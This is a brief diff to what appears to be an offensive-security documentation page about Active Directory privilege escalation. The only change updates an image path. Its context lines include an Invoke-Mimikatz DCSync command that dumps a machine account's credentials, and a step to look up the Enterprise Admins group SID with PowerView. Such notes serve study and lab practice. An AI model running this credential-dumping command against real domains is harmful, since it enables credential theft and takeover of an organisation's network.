@@ -30,7 +30,7 @@ The attack is executed from the perspective of already gaining domain admin priv
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:amsterdam\bank$"'
 ```
 
-![](<../../../.gitbook/assets/image (9).png>)
+![](<../../../.gitbook/assets/image (9) (1).png>)
 
 4\. Retrieve the SID of the enterprise Admins group, using PowerView:
 
